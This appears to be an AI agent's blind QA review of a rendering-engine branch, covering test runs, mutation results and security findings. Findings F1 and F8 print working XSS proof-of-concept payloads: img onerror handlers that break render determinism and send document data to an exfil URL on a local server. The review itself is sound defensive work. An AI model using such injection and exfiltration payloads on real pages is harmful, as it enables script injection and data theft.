# Phase 4 gate review — blind QA

Reviewer: blind QA agent. Nothing under `docs/superpowers/worklog/video/phase-04/`
was read. Sources used: the spec, `CLAUDE.md`, `DECISIONS.md`, and the branch's
code and tests.

Branch reviewed: `feat/video-phase-04-engine` (`git diff main...HEAD`, 23 commits,
28 files).

## What I ran

| command | result |
|---|---|
| `uv run pytest -q` | `1238 passed, 1 warning in 11.85s` |
| `engine/ node determinism.test.mjs` | `deterministic` — includes `beat 0..10 renders its text` and `every builder has a fixture (10)` |
| `engine/ node network.test.mjs` | `no request escapes the page` — 10 vectors |
| `engine/ node render.mjs --day 2026-08-14 --probe` | `2026-08-14 · 119.99s · 3600 frames @ 30fps`, 25 probe frames |
| `engine/ node render.mjs --day 2026-08-12 --probe` | `2026-08-12 · 119.97s · 3599 frames @ 30fps`, 24 probe frames |
| 23 hand-written mutants across `planbuild.js`, `engine.js`, `scene.html`, `script.py`, `series.py` | 20 caught, 2 survived, 1 equivalent |
| hostile-input probes in a real Chromium page via Playwright, and against the real Python schema | see findings |

Exit criterion: **met.** `RENDERABLE == set(BUILDERS)` is pinned by
`test_every_renderable_type_has_a_builder`, and `determinism.test.mjs` renders
one fixture per builder on a real page and asserts the beat's own words reach
`innerText`. All ten types draw.

---

## Findings

### F1 — HIGH. `jumpChart.rows[].shown` is an unattested arbitrary-JS execution surface

`engine/planbuild.js:446` passes `shown` through untouched; `engine/engine.js:139`
sets it as `html`. That is the documented innerHTML exemption — but innerHTML is
not the whole of what it grants. Inline event handlers run, because
`scene.html:48` must keep `script-src 'unsafe-inline'` for its own bootstrap.

`spec §7.1` requires manual attestation for the one type that executes author
code, and `script.py:461 attestation()` implements that for `custom`. `shown` is
executed code with none of it: no `attest`, no `custom_js` determinism lint, and
`cli.py:288`'s `jumpChart` summariser prints **only the row labels**, so the
approver never sees the field at all.

Verified, real page, real `scene.html`:

```
# beat: jumpChart, shown = '<img src=x onerror="window.__PWNED=1;
#   document.getElementById(\'brand\').textContent=\'OWNED\'">'
PWNED = 1
brand = OWNED
cspViolations = []
pageerrors = [ 'console:Failed to load resource: net::ERR_FILE_NOT_FOUND' ]
```

There is **no CSP violation**: `src=x` resolves as a relative `file://` path, so
`img-src 'self'` permits the request; the file is missing, `onerror` fires, and
`'unsafe-inline'` lets the handler run.

**It breaks `window.__seek(t)` purity**, the invariant `CLAUDE.md` calls
load-bearing. With `shown` = `<img src=x onerror="this.parentNode.appendChild(
document.createTextNode(Date.now()))">`:

```
seek 1.0 -> 1787014950713
seek 8.0 (other scene) -> (none)
seek 1.0 again -> 1787014950966
csp = []
```

Same `t`, different frame. `script.py`'s `NONDETERMINISTIC` regexes only ever see
`custom.js`, so `Date.now()` in `shown` is never linted.

**It reaches the network.** Full chain, plain `jumpChart` beat, no `custom`:

```
# shown: '<s>34.4</s> &rarr; 43.6<img src=x
#   onerror="location.href=\'http://127.0.0.1:PORT/exfil?d=\'+
#            encodeURIComponent(document.title)">'
server hits: [ '/exfil?d=The%20Brief' ]
final url: http://127.0.0.1:55658/exfil?d=The%20Brief
```

And the Python side accepts it, while the review screen hides it:

```
jump_rows says: None
review line: 'FrontierCode'
```

`network.test.mjs` does not catch this: all ten of its vectors are sub-resource
loads, and none is a top-level navigation. The commit "the render page cannot
reach the network" is not true as stated.

Note this is *not* the same as the `custom` beat's execution surface, which is
disclosed, attested and reviewed. `shown` is documented as a display override
for `<s>34.4</s> &rarr; 43.6`.

### F2 — MEDIUM. `shown` can state a figure the bar does not draw, and nothing checks it

Same field, no code needed. `planbuild.js:461 buildJumpChart` draws the geometry
from `before`/`after` and the label from `shown`, and never relates them:

```
# rows: [{label: FrontierCode, before: 34.4, after: 43.6,
#         shown: "<s>34.4</s> &rarr; 91.7"}]   scale: 70
jval:      ['<s>34.4</s> &rarr; 91.7']
dot lefts: ['49.14285714285714%', '62.285714285714285%']    # = 34.4/70, 43.6/70
```

91.7 is in no source, no quote and no plan. This is exactly the failure
`requireCountFitsHold` was written to prevent for this type — `planbuild.js:307`,
"the frame contradicts its own label" — reachable directly, by authoring it.
Phase 5 will verify `before`/`after`; `shown` is free HTML beside them.

The same channel exists more mildly on `kpis`: `unit`/`prefix` are deliberately
free, so `{value: 3, unit: "x faster than the 47% baseline"}` renders
`3x faster than the 47% baseline` inside `.n` on a beat whose only §7.2
obligation is that `3` appear in the quote.

### F3 — MEDIUM. "A dumbbell renders no numbers at all" is asserted three times and enforced nowhere

`script.py:160` ("it renders no numbers at all"), `engine.js:170` ("nothing here
prints one") and `test_a_dumbbell_needs_no_citation` ("it renders no numbers, so
there is no number that has to be in a source") all rest on the property. It is
true of `values`, and false of the type. `caption`, `footnote`, row `label` and
row `note` are all unconstrained text and all reach the stage:

```
DUMBBELL RENDERED TEXT:  Rated 4.2 out of 5 by 27 evaluators   AMIE (video)
  Primary care physician  both  History-taking (0.72) +18 pts   lower higher →
  Direction only. n=159 cases, 2026.
```

`dumbbell` is `cited: False`, so that card renders `+18 pts` and `4.2 out of 5`
with **no `src` and no `quote` required anywhere in the pipeline**. The
justification for the exemption is the property that isn't held.

The test is fixture-glyph-specific, which is the D-035 shape: it checks the six
literal strings `0.72 0.82 0.58 72 82 58` are absent, not that no digit renders.
Mutant **M1** — `planDumbbellRows` appends `v[0].toFixed(1)` to every row's note,
so the chart prints `0.7`, `0.8` beside each label — **survives the entire
suite**: `pytest=0 determinism=0 network=0`. Ask the D-035 question of it: if the
code did nothing the test still passes, and if the code printed a *rounded*
position the test still passes.

Fix shape: assert `not re.search(r"\d", rendered_text)` over a fixture whose
prose is digit-free, and decide explicitly whether digits in `note`/`caption`
should be schema-refused or whether `dumbbell` should become `cited: True`.

### F4 — MEDIUM. `dumbbellGaps`'s `!==` is untested; the test that claims to cover it tests `engine.js` instead

Mutant **M7** — `planbuild.js:516`, `rows[i][1] !== rows[i][2]` → `>` — **survives
the whole suite** (`pytest=0 determinism=0 network=0`).

`test_a_row_where_the_second_series_is_higher_also_separates` is written for
exactly this ("a hole my own mutation sweep found"), but it asserts on
`.dot a`/`.dot b`/`.dot merged`, and those are decided by `engine.js:184`'s own
independent `const gap=a!==b`. `planbuild.js`'s `dumbbellGaps` feeds two
different things — `requiredHold` and the legend's third "both" swatch — and
neither is asserted on a row where the *second* series is higher. Under `>`, a
chart of rows like `[0.4, 0.8]` gets a "both" legend key matching no marker on
the card, and `requiredHold` returns 0 for rows that do travel, re-opening the
D-082 mid-animation freeze the phase closed. Confirmed the real code is correct:

```
LEGEND KIDS (second series higher): 2 ['AMIE (video)', 'Primary care physician']
```

So this is a test-coverage finding, not a live bug. It is the D-064 pattern: an
assertion that reads like it constrains the new code, and constrains a different
file that happens to agree.

### F5 — LOW. `decimals` has no upper bound: a valid `script.yaml` that crashes the render

`script.py:400` accepts any non-negative int. `toFixed` accepts 0–100.

```
decimals=101 value=0.5 python: None        # kpi_items accepts it
   node RAISED: RangeError: toFixed() digits argument must be between 0 and 100
```

It fails loudly at build-walk time rather than rendering something wrong, so the
harm is a confusing error after the operator has already got to `render`. Worth a
one-line bound with the message the rest of this module writes.

### F6 — LOW. A `value` at or above 1e21 renders in exponential notation

Both gates pass it, because both gates ask `Number(v.toFixed(d)) === v`:

```
decimals=1, 1e21 -> 1e+21          check passes? true
decimals=0, 1e21 -> 1,000,000,000,000,000,000,000
```

`1e+21` on the frame is a figure the plan does not carry. Absurd input for this
series; noting it because it is the one input I found that defeats R2 *silently*
rather than loudly.

### F7 — LOW / by design. Stray asterisks are deleted from the frame

The prose vocabulary is closed and documented, so this is behaviour rather than a
bug, but it deletes authored characters without saying so:

```
"5 * 3 and 2 * 4"          -> "5 <em> 3 and 2 </em> 4"      (renders "5  3 and 2  4")
"o3* and o4* models"       -> "o3<em> and o4</em> models"
"profit 12%* (see note*)"  -> "profit 12%<em> (see note</em>)"
```

Two footnote daggers in one field silently vanish and the text between them turns
accent-blue. Confirmed in Chromium that the text nodes lose the characters.

Also: `"***bold and em***"` emits `<b><em>x</b></em>`, improperly nested. Chromium
repairs it to `<b><em>x</em></b>` and the text survives intact, so the frame is
fine — but if Phase 5 compares the string `planbuild` set against the DOM it
serialises, those two differ. Verified in a real page.

I could not construct any prose input that produces a live HTML tag: the
escape-then-convert order holds against every case I tried (`&amp;` stays five
characters, `<script>` stays text, `**AT&T**` bolds correctly, greedy/lazy and
newline cases all correct). That path is sound.

### F8 — INFO. Top-level navigation exfiltration reproduces, exactly as `scene.html:43` discloses

```
# custom beat: location.href = 'http://127.0.0.1:PORT/exfil?d=' + document.title
server hits: [ '/exfil?d=The%20Brief' ]
```

Disclosed in the file's own comment, so not a surprise. Flagged only because no
test pins it: `network.test.mjs` asserts "no request escapes the page" and this
request escapes the page. A residual risk with a passing test that says otherwise
is one refactor away from being read as covered.

---

## Mutation results

23 mutants. 20 caught, 2 survived, 1 equivalent.

**Caught** — each by at least one suite, exit code checked directly (not through
a pipe; my first sweep's `| tail` masked the node suites' exit codes, so all
apparent survivors were re-run without it):

`proseHTML` converts before escaping · `escapeHTML` drops the `&` rule ·
`requireExactAtDecimals` never throws · `requireCountFitsHold` never throws ·
jumpChart upper bound removed · `requireCitation` checks only `src` · dumbbell
footnote set as `html` · dumbbell caption not prose · `buildCustom` swallows a
syntax error · kpi string branch drops prefix/unit · list items rendered as text
· `requiredHold` staggers from `items.length` · dumbbell axis words dropped ·
`jumpChart.shown` ignored · title card ignores `series_name` · CSP meta tag
removed entirely · Python: kpi rounding check removed · Python: dumbbell track
bound removed · Python: design colour regex accepts anything · Python: custom
attestation may be empty.

That is a strong result. `requiredHold`'s derivation from `engine.js`'s own
constants is genuinely pinned (the `engine_with` helper moves the constant and
watches the requirement follow), and the CSP has a mutant that kills it.

**Survived** — F3 (M1) and F4 (M7), above.

**Equivalent, not a finding:** removing `connect-src 'none'` from `scene.html`
leaves `network.test.mjs` green, and correctly so — `default-src 'self'` is the
fallback for `connect-src`, so the directive is documentation rather than
enforcement over `file://`. I verified this rather than filing it.

---

## Verdict

**Do not merge as-is. Fix F1 first.**

The catalogue work is good and the exit criterion is genuinely met, not merely
asserted. The test suite is above this project's already-high bar: 20 of 23
deliberate breaks were caught, including every one I aimed at the escape-then-
convert order, the citation gate, the display-rounding gate and the count-fits-
hold gate.

But F1 is a regression against two of the project's own load-bearing rules, in
code this phase wrote, on a beat type this phase declared *strictly verifiable*:
a plain data field runs arbitrary JavaScript, breaks `__seek(t)` purity with no
lint in its path, requires no attestation, is invisible on the review screen, and
reaches the network from the operator's machine. It should be closed (sanitise
`shown` to a whitelist — `<s>`, `<em>`, `<b>`, entities — or route it through
`proseHTML` with a widened vocabulary, or require `attest` on any beat carrying
raw HTML) and pinned by a test in `network.test.mjs` that drives the vector from
a *non-custom* beat.

F2, F3 and F4 are cheap and should ride along: F3 and F4 are one assertion each,
and F2 needs a decision recorded more than it needs code. F5–F7 are follow-ups.
